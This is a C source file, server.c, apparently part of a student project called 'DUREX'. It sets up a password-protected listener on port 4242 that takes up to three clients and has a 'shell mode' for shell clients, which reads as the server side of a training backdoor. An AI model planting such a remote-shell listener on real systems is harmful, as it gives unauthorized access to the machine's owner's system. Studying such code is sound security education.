/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/13 13:38:25 by user42            #+#    #+#             */
/*   Updated: 2022/02/16 12:27:27 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	setup_server(t_server *server)
{
	struct sockaddr_in		sockaddr;
	int						enable = 1;

	server->last_id = 0;
	server->clients = 0;
	server->client_nb = 0;
	server->shell_started = 0;

	if ((server->listen_sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		fatal(server);
	setsockopt(server->listen_sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
	
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(4242);
	sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(server->listen_sd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0)
		fatal(server);
	if (listen(server->listen_sd, 50) < 0)
		fatal(server);

	server->pfds = calloc(4, sizeof(struct pollfd));
	server->nfds = 4;
	server->pfds[0].fd = server->listen_sd;
	server->pfds[0].events = POLLIN;

	int i = 1;
	while (i < 4)
	{
		server->pfds[i].fd = -1;
		server->pfds[i].events = POLLIN;
		i++;
	}
}

void	rm_client(t_server *server, t_client *client)
{
	t_client	*tmp = server->clients;
	t_client	*del;

	server->client_nb--;
	if (!tmp)
		return ;
	if (tmp->fd == client->fd)
	{
		for (int i = 1; i < 4; i++)
		{
			if (server->pfds[i].fd == client->fd)
				server->pfds[i].fd = -1;
		}
		server->clients = tmp->next;
		free(tmp);
	}
	else
	{
		while (tmp && tmp->next && tmp->next->fd != client->fd)
			tmp = tmp->next;
		for (int i = 1; i < 4; i++)
		{
			if (server->pfds[i].fd == client->fd)
				server->pfds[i].fd = -1;
		}
		del = tmp->next;
		tmp->next = tmp->next->next;
		free(del);
	}
}

void	shutdown_connection(t_server *server, t_client *client)
{
	printf("[LOG] Client %i just left.\n", client->id);
	close(client->fd);
	rm_client(server, client);
}

int		add_client_to_list(t_server *server, int new_sd)
{
	t_client	*tmp = server->clients;
	t_client	*new;

	if (!(new = malloc(1 * sizeof(t_client))))
		fatal(server);
	new->fd = new_sd;
	new->id = server->last_id++;
	new->auth = 0;
	new->next = 0;
	new->pid = -1;

	if (!tmp)
		server->clients = new;
	else
	{
		while (tmp->next)
			tmp = tmp->next;
		tmp->next = new;
	}
	return (new->id);
}

void	authenticate(t_server *server, t_client *client)
{
	if (strcmp(crypt(server->buff, SALT), HASHED_PASSWD) != 0)
		send_info(server, client->fd, "[!] Invalid password.\nPassword: ");
	else
	{
		client->auth = 1;
		send_info(server, client->fd, "Authentication successfull. Type '?' to see list of commands.\n");
		send_info(server, client->fd, "$> ");
	}
}

void	reject_client(t_server *server, int fd)
{
	send_info(server, fd, "[!] There is already 3 clients connected on daemon.\nBye!\n");
	close(fd);
}

void	add_client(t_server *server)
{
	int						new_sd;

	if ((new_sd = accept(server->listen_sd, NULL, NULL)) < 0)
		fatal(server);
	if (server->client_nb >= 3)
		return (reject_client(server, new_sd));
	printf("[LOG] Client %i just arrived.\n", add_client_to_list(server, new_sd));
	send_info(server, new_sd, "		==== DUREX v1.0 ====\nPassword: ");
	server->client_nb++;
	server->pfds[server->client_nb].fd = new_sd;
}

int		add_shell_client(t_server *server)
{
	int new_sd = accept(server->listen_sd, NULL, NULL);
	if (server->client_nb >= 3)
	{
		reject_client(server, new_sd);
		return (-1);
	}
	server->client_nb++;
	server->shell_started = 1;
	printf("[SHELL MODE] Got a shell client with fd %d\n", new_sd);
	return (add_client_to_list(server, new_sd));
}

void	reset_server(t_server *server)
{
	t_client	*tmp = server->clients;
	t_client	*del;

	while (tmp)
	{
		del = tmp->next;
		close(tmp->fd);
		free(tmp);
		tmp = del;
	}

	server->last_id = 0;
	server->clients = 0;
	server->client_nb = 0;
	server->shell_started = 0;

	int i = 1;
	while (i < 4)
	{
		server->pfds[i].fd = -1;
		server->pfds[i].events = POLLIN;
		i++;
	}

	printf("[LOG] Kicking everyone from server.\n");
}
